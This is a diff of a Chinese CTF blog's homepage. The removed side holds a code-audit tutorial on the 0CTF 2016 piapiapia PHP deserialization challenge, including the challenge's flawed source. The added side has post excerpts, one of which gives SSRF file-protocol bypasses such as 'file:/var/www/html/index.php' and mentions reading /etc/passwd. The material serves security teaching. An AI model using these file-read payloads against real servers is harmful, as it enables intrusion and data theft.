@@ -1,572 +1,139 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <meta charset="utf-8">
-  
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Kee1ong's Blog - Keep your dream &amp; Never give up</title><meta name="description"><meta name="author" content="Kee1ongZ"><meta name="copyright" content="Kee1ongZ"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://kee1ong.github.io/"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin="crossorigin"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta property="og:type" content="website"><meta property="og:title" content="Kee1ong's Blog"><meta property="og:url" content="https://kee1ong.github.io/"><meta property="og:site_name" content="Kee1ong's Blog"><meta property="og:description"><meta property="og:image" content="https://kee1ong.github.io/img/avatar.png"><meta property="article:published_time" content="2020-08-17T03:45:01.385Z"><meta property="article:modified_time" content="2020-08-17T03:45:01.385Z"><meta name="twitter:card" content="summary"><script>var activateDarkMode = function () {
+  document.documentElement.setAttribute('data-theme', 'dark')
+  if (document.querySelector('meta[name="theme-color"]') !== null) {
+    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#000')
+  }
+}
+var activateLightMode = function () {
+  document.documentElement.setAttribute('data-theme', 'light')
+  if (document.querySelector('meta[name="theme-color"]') !== null) {
+    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#fff')
+  }
+}
+
+var getCookies = function (name) {
+  const value = `; ${document.cookie}`
+  const parts = value.split(`; ${name}=`)
+  if (parts.length === 2) return parts.pop().split(';').shift()
+}
+
+var autoChangeMode = 'false'
+var t = getCookies('theme')
+if (autoChangeMode === '1') {
+  var isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+  var isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+  var isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+  if (t === undefined) {
+    if (isLightMode) activateLightMode()
+    else if (isDarkMode) activateDarkMode()
+    else if (isNotSpecified || hasNoSupport) {
+      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
+      var now = new Date()
+      var hour = now.getHours()
+      var isNight = hour <= 6 || hour >= 18
+      isNight ? activateDarkMode() : activateLightMode()
+    }
+    window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+      if (Cookies.get('theme') === undefined) {
+        e.matches ? activateDarkMode() : activateLightMode()
+      }
+    })
+  } else if (t === 'light') activateLightMode()
+  else activateDarkMode()
+} else if (autoChangeMode === '2') {
+  now = new Date()
+  hour = now.getHours()
+  isNight = hour <= 6 || hour >= 18
+  if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+  else if (t === 'light') activateLightMode()
+  else activateDarkMode()
+} else {
+  if (t === 'dark') activateDarkMode()
+  else if (t === 'light') activateLightMode()
+}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  hexoversion: '5.0.2',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  bookmark: {
+    message_prev: '按',
+    message_next: '键将本页加入书签'
+  },
+  runtime_unit: '天',
+  runtime: false,
+  copyright: undefined,
+  ClickShowText: undefined,
+  medium_zoom: false,
+  fancybox: true,
+  Snackbar: undefined,
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  baiduPush: false,
+  highlightCopy: true,
+  highlightLang: true,
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isanchor: false    
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: false,
+  isHome: true,
+  isHighlightShrink: false,
+  isSidebar: false,
+  postUpdate: '2020-08-17 11:45:01'
+}</script><noscript><style>
+#nav {
+  opacity: 1
+}
+.justified-gallery img {
+  opacity: 1
+}
+</style></noscript><meta name="generator" content="Hexo 5.0.2"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" data-lazy-src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">3</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">2</div></a></div></div></div><hr/></div></div><div id="body-wrap"><header class="full_page" id="page-header" style="background-image: url(https://i.loli.net/2020/05/01/IuWi8QbHvzjlOPw.jpg)"><nav id="nav"><span class="pull-left" id="blog_name"><a class="blog_title" id="site-name" href="/">Kee1ong's Blog</a></span><span class="pull-right menus"><span class="toggle-menu close"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="site-info"><h1 id="site_title">Kee1ong's Blog</h1><div id="site_subtitle"><span id="subtitle"></span></div></div><div id="scroll_down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout_page" id="content-inner"><div class="recent-posts" id="recent-posts"><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2020/08/16/dmsj1/" title="【代码审计】CTF中的代码审计题目应对策略（一）">     <img class="post_bg" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【代码审计】CTF中的代码审计题目应对策略（一）"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/08/16/dmsj1/" title="【代码审计】CTF中的代码审计题目应对策略（一）">【代码审计】CTF中的代码审计题目应对策略（一）</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2020-08-16T11:24:13.000Z" title="发表于 2020-08-16 19:24:13">2020-08-16</time></span></div><div class="content">I.前言​   目前，CTF赛事中关于代码审计的题目，已经从一开始的简单函数trick、逻辑绕过逐渐向框架分析、0day改编甚至新出0day（2020WMCTF）过渡。这类题目具有文件多，代码量大复杂的特点，难以下手。以PHP为例，Thinkphp，Laravel，typecho等框架/CMS（甚至包括一些运维工具，例如WMCTF中涉及到了宝塔）都已经沦为出题点。
+  实际上，如果单看题目考察的知识点，一般都不是很难。解不出来的原因，通常为：无法准确定位触发点/看不太懂/代码量太大劝退。本文以初学者的角度，通过一道审计类CTF题目，来谈一谈如何上手审计类题目/顺带复习反序列化的trick。
+II.例题：[0CTF 2016]piapiapia先来看一下题目。一个登录界面，尝试SQL注入，无果。
 
-  
-  <title>Kee1ong&#39;s Blog</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Kee1ong&#39;s Blog">
-<meta property="og:url" content="https://kee1ong.github.io/index.html">
-<meta property="og:site_name" content="Kee1ong&#39;s Blog">
-<meta property="og:locale" content="zh_CN">
-<meta property="article:author" content="Kee1ongZ">
-<meta name="twitter:card" content="summary">
-  
-    <link rel="alternate" href="/atom.xml" title="Kee1ong&#39;s Blog" type="application/atom+xml">
-  
-  
-    <link rel="icon" href="/favicon.png">
-  
-  
-    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
-  
-  
-<link rel="stylesheet" href="/css/style.css">
+通过扫目录工具（dirsearch/御剑）等，发现www.zip。存在源码泄露。解压后如下：
 
-<meta name="generator" content="Hexo 5.0.2"></head>
+这里基本可以确定是一道审计题目了。
+P1：确定入口点：利用审计工具这里用vscode打开该文件夹，再来看一下目录结构：
 
-<body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">Kee1ong&#39;s Blog</a>
-      </h1>
-      
-    </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"></a>
-        
-          <a class="main-nav-link" href="/">Home</a>
-        
-          <a class="main-nav-link" href="/archives">Archives</a>
-        
-      </nav>
-      <nav id="sub-nav">
-        
-          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
-        
-        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://kee1ong.github.io"></form>
-      </div>
-    </div>
-  </div>
-</header>
-      <div class="outer">
-        <section id="main">
-  
-    <article id="post-dmsj1" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/08/16/dmsj1/" class="article-date">
-  <time datetime="2020-08-16T11:24:13.000Z" itemprop="datePublished">2020-08-16</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/08/16/dmsj1/">【代码审计】CTF中的代码审计题目应对策略（一）</a>
-    </h1>
-  
+如果是学过PHP开发的同学可能很熟悉这种布局：全局config+class， ...</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2020/08/16/gkctf2/" title="【GKCTF2020】Web部分Writeup——PartII">     <img class="post_bg" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【GKCTF2020】Web部分Writeup——PartII"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/08/16/gkctf2/" title="【GKCTF2020】Web部分Writeup——PartII">【GKCTF2020】Web部分Writeup——PartII</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2020-08-16T10:53:35.000Z" title="发表于 2020-08-16 18:53:35">2020-08-16</time></span></div><div class="content">休息日补一下GKCTF Web部分剩下的题。
+总的来说难度都不大，基本都是在现成的CVE上进行了更改。但自己做题时间有点过慢，估计还是不熟练吧。继续努力。
+[GKCTF2020]EZ三剑客–EzWeb考点：SSRF bypass+Redis未授权进去后F12看源码，有注释提示：
 
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="I-前言"><a href="#I-前言" class="headerlink" title="I.前言"></a>I.前言</h1><p>​   目前，CTF赛事中关于代码审计的题目，已经从一开始的简单函数trick、逻辑绕过逐渐向框架分析、0day改编甚至新出0day（2020WMCTF）过渡。这类题目具有文件多，代码量大复杂的特点，难以下手。以PHP为例，Thinkphp，Laravel，typecho等框架/CMS（甚至包括一些运维工具，例如WMCTF中涉及到了宝塔）都已经沦为出题点。</p>
-<p>  实际上，如果单看题目考察的知识点，一般都不是很难。解不出来的原因，通常为：无法准确定位触发点/看不太懂/代码量太大劝退。本文以初学者的角度，通过一道审计类CTF题目，来谈一谈如何上手审计类题目/顺带复习反序列化的trick。</p>
-<h1 id="II-例题：-0CTF-2016-piapiapia"><a href="#II-例题：-0CTF-2016-piapiapia" class="headerlink" title="II.例题：[0CTF 2016]piapiapia"></a>II.例题：[0CTF 2016]piapiapia</h1><p>先来看一下题目。一个登录界面，尝试SQL注入，无果。</p>
-<p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200811181116317.png" alt="image-20200811181116317"></p>
-<p>通过扫目录工具（dirsearch/御剑）等，发现<code>www.zip</code>。存在源码泄露。解压后如下：</p>
-<p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200811181215179.png" alt="image-20200811181215179"></p>
-<p>这里基本可以确定是一道审计题目了。</p>
-<h2 id="P1：确定入口点：利用审计工具"><a href="#P1：确定入口点：利用审计工具" class="headerlink" title="P1：确定入口点：利用审计工具"></a>P1：确定入口点：利用审计工具</h2><p>这里用vscode打开该文件夹，再来看一下目录结构：</p>
-<p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200811181634141.png" alt="image-20200811181634141"></p>
-<p>如果是学过PHP开发的同学可能很熟悉这种布局：全局config+class，其他页面调用。</p>
-<p>首先说一下，代码审计的几个入手点（刚学没几天，不全面勿喷）：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1.找到入口点，逐个突破</span><br><span class="line">顾名思义，对于大多数页面，我们可以找到站点入口页面：index.php,admin.php,login.php等。逐一步进来分析。对于代码量小的源码可以采取这种方式。但当分析完整的框架&#x2F;CMS时，基本可以gg。</span><br><span class="line">2.危险函数&#x2F;参数回溯法</span><br><span class="line">最常用的审计（挖洞）方法。需要结合一些工具（例如：Xdebug+各类IDE）。通过部署环境——全局通扫危险函数&#x2F;敏感参数——下断点&#x2F;手动回溯——寻找是否存在利用链。这种方法可以快速定位潜在漏洞点上下文。</span><br><span class="line">假如我们通扫到shell_exec,call_user_function,sql_query,eval这些喜闻乐见的函数，就可以定位到此处，然后回溯来推出是否存在利用链。</span><br><span class="line">3.业务逻辑分析法</span><br><span class="line">其实在做CTF的题目时候，我们都在使用这种方法。</span><br><span class="line">存在登录框：是否存在SQL注入</span><br><span class="line">存在登录&#x2F;注册功能：是否存在二次注入</span><br><span class="line">存在上传页面：是否存在上传</span><br><span class="line">存在传URL参：是否存在SSRF</span><br><span class="line">……</span><br><span class="line">对于大的CMS，可以先部署完后，看一下存在什么功能。某些功能是漏洞的常客：初始安装（脱库），数据库备份（mysql重装getshell），密码找回（越权）等等。</span><br></pre></td></tr></table></figure>
+那我们传个参试一下，应该是输出了ipconfig的结果。可以看到存在内网：173.37.86.X
 
-<h3 id="P1-1-关注敏感页面"><a href="#P1-1-关注敏感页面" class="headerlink" title="P1.1 关注敏感页面"></a>P1.1 关注敏感页面</h3><p>其实这类页面一般都是配置页面：config.php,conn.php,sql.php一类的。</p>
-<p>我们关注一下config.php，发现存在变量$flag.</p>
-<p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200811185243464.png" alt="image-20200811185243464"></p>
-<p>那么这道题的最终目的就是读到config.php。从而获得flag。</p>
-<h3 id="P1-2-寻找敏感函数-参数"><a href="#P1-2-寻找敏感函数-参数" class="headerlink" title="P1.2 寻找敏感函数/参数"></a>P1.2 寻找敏感函数/参数</h3><p>这里简单看一下各个页面的代码。发现其实是纸老虎：最多的class.php也不过100行。其他的页面包括前端也就60，70行。</p>
-<p><strong>对于这种多页面/各个页面代码量较少的源码</strong>，在比赛这种追求效率的场景，不要多想。直接上工具。实际上我们的思路就是上述提到的方法中的第二条，通过审计工具通扫源码——找到潜在漏洞点——回溯上下文，寻找利用链。</p>
-<p>这里使用Seay 2.1，虽然好久不更新了，不过依旧是初级代码审计的神器。自动审计一下，结果如下：</p>
-<p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200811185537774.png" alt="image-20200811185537774"></p>
-<p>注意一下本题的最终目的：<strong>读取config.php</strong>。这正好与第三条的描述不谋而合：</p>
-<p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200811185621538.png" alt="image-20200811185621538"></p>
-<p>那么我们就可以认为此处是潜在漏洞点，下面开始回溯。</p>
-<h2 id="P2-回溯——推出利用链"><a href="#P2-回溯——推出利用链" class="headerlink" title="P2 回溯——推出利用链"></a>P2 回溯——推出利用链</h2><h3 id="P2-1-利用链终点——profile-php"><a href="#P2-1-利用链终点——profile-php" class="headerlink" title="P2.1 利用链终点——profile.php"></a>P2.1 利用链终点——profile.php</h3><p>根据审计结果，在源码中定位到对应位置：</p>
-<p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200811190626062.png" alt="image-20200811190626062"></p>
-<p>可以看一下这一段的逻辑：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">根据登录的用户名去执行class.php中的show_profile函数，得到序列化数组$profile</span><br><span class="line">---&gt;</span><br><span class="line">$profile经过一次反序列化</span><br><span class="line">---&gt;</span><br><span class="line">成为了键值数组</span><br><span class="line">---&gt;</span><br><span class="line">读取该数组，根据键名给对应变量赋值</span><br></pre></td></tr></table></figure>
+结合题目输入框的URL，感觉就是SSRF题目了。
+P1:读源码这里第一反应就是先尝试用file协议读源码，发现被过滤。
+这里bypass的方法有两种：
+12一个斜杠 file:/带空格  file ://
 
-<p>这里先来看一下class.php的show_profile函数，分析请见注释：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span> <span class="keyword">extends</span> <span class="title">mysql</span></span>&#123; <span class="comment">//该类继承于mysql类（在下面）</span></span><br><span class="line">    <span class="keyword">private</span> $table = <span class="string">&#x27;users&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show_profile</span>(<span class="params">$username</span>) </span>&#123; <span class="comment">//接受参数：用户名</span></span><br><span class="line">        $username = <span class="built_in">parent</span>::filter($username); </span><br><span class="line">        <span class="comment">//首先调用父类（mysql）中的filter过滤一哈</span></span><br><span class="line">        $where = <span class="string">&quot;username = &#x27;$username&#x27;&quot;</span>;</span><br><span class="line">        <span class="comment">//拼接成SQL参数，调用mysql类中的select函数，并将结果（为数组形式）中的profile键取出作为返回值。</span></span><br><span class="line">        $object = <span class="built_in">parent</span>::select(<span class="keyword">$this</span>-&gt;table, $where);</span><br><span class="line">        <span class="keyword">return</span> $object-&gt;profile;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span>(<span class="params">$username, $new_profile</span>) </span>&#123;</span><br><span class="line">        $username = <span class="built_in">parent</span>::filter($username);</span><br><span class="line">        $new_profile = <span class="built_in">parent</span>::filter($new_profile);</span><br><span class="line"></span><br><span class="line">        $where = <span class="string">&quot;username = &#x27;$username&#x27;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">&#x27;profile&#x27;</span>, $new_profile, $where);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">__class__</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mysql</span> </span>&#123;  <span class="comment">//user的父类</span></span><br><span class="line">    <span class="keyword">private</span> $link = <span class="literal">null</span>;</span><br><span class="line">        ......</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params">$table, $where, $ret = <span class="string">&#x27;*&#x27;</span></span>) </span>&#123; <span class="comment">//查库函数</span></span><br><span class="line">        $sql = <span class="string">&quot;SELECT $ret FROM $table WHERE $where&quot;</span>;</span><br><span class="line">        $result = mysql_query($sql, <span class="keyword">$this</span>-&gt;link);</span><br><span class="line">        <span class="keyword">return</span> mysql_fetch_object($result);<span class="comment">//将查询结果作为键值数组返回</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$string</span>) </span>&#123; <span class="comment">//过滤函数，后面详细说明。本题关键</span></span><br><span class="line">        $escape = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">        $escape = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, $escape) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">        $string = preg_replace($escape, <span class="string">&#x27;_&#x27;</span>, $string);</span><br><span class="line"></span><br><span class="line">        $safe = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">        $safe = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, $safe) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> preg_replace($safe, <span class="string">&#x27;hacker&#x27;</span>, $string);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">__class__</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+读取etc/passwd无果，看来是有限制。那么读取一下index.php源码，成功：
+1file:/var/www/html/index.php
 
-<p>先不管class.php。我们根据上述分析，得到最关键的信息是：</p>
-<p><strong>$profile的photo键值会被当做文件名由file_get_contents读取，然后经过base64转码输出</strong></p>
-<p>这就是利用链的终点。</p>
-<h3 id="P2-2-关键页面——update-php"><a href="#P2-2-关键页面——update-php" class="headerlink" title="P2.2 关键页面——update.php"></a>P2.2 关键页面——update.php</h3><p>那么继续回推，序列化的<code>$profile</code>在哪里可以得到呢？</p>
-<p>我这里的思路是，全局搜索序列化函数的关键字serialize，来找到哪里发生了序列化操作：</p>
-<p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200811194732001.png" alt="image-20200811194732001"></p>
-<p>除去<code>$profile.php</code>以外，发现<code>update.php</code>中存在序列化函数：</p>
-<p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200811195140990.png" alt="image-20200811195140990"></p>
-<p>这里结合整个<code>update.php</code>页面来说下逻辑：</p>
-<p>**1.**该页面可以修改用户的phone，email，nickname与photo</p>
-<p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200811195403999.png" alt="image-20200811195403999"></p>
-<p>**2.**会对传过来的参数经过一系列过滤，之后将其序列化。将其与用户名<code>$username</code>作为<code>class.php</code>的<code>update_profile</code>的参数传入，之后跳转到<code>profile.php</code>:</p>
-<p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200811195558244.png" alt="image-20200811195558244"></p>
-<p>**3.**同样，来看一下update_profile函数</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span>(<span class="params">$username, $new_profile</span>) </span>&#123; </span><br><span class="line">        $username = <span class="built_in">parent</span>::filter($username); <span class="comment">//过滤</span></span><br><span class="line">        $new_profile = <span class="built_in">parent</span>::filter($new_profile); <span class="comment">//过滤</span></span><br><span class="line"></span><br><span class="line">        $where = <span class="string">&quot;username = &#x27;$username&#x27;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">&#x27;profile&#x27;</span>, $new_profile, $where);</span><br><span class="line">    &#125;<span class="comment">//调用update函数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//mysql类</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params">$table, $key, $value, $where</span>) </span>&#123;</span><br><span class="line">        $sql = <span class="string">&quot;UPDATE $table SET $key = &#x27;$value&#x27; WHERE $where&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> mysql_query($sql);<span class="comment">//很简单的逻辑，正常传参执行sql语句</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$string</span>) </span>&#123; <span class="comment">//过滤函数</span></span><br><span class="line">        $escape = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">        $escape = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, $escape) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">        $string = preg_replace($escape, <span class="string">&#x27;_&#x27;</span>, $string);</span><br><span class="line"></span><br><span class="line">        $safe = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">        $safe = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, $safe) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> preg_replace($safe, <span class="string">&#x27;hacker&#x27;</span>, $string);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
-<p>看来构造序列化的关键就在<code>update.php</code>页面了。</p>
-<p>但由上可知，在此之前，我们首先得是一个用户。那么<code>register.php</code>和<code>index.php</code>的作用就不言而喻了。分别是注册页面和登录页面，注册登陆后我们才可以访问<code>profile.php</code>:</p>
-<p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200811202108423.png" alt="image-20200811202108423"></p>
-<p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200811202117982.png" alt="image-20200811202117982"></p>
-<p>到此为止，我们算是理清了整个网站的逻辑：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">注册：register.php</span><br><span class="line">----&gt;</span><br><span class="line">登录：index.php</span><br><span class="line">-----&gt;</span><br><span class="line">修改个人资料：update.php</span><br><span class="line">-----&gt;</span><br><span class="line">展示个人资料：profile.php</span><br></pre></td></tr></table></figure>
+主页源码如下:
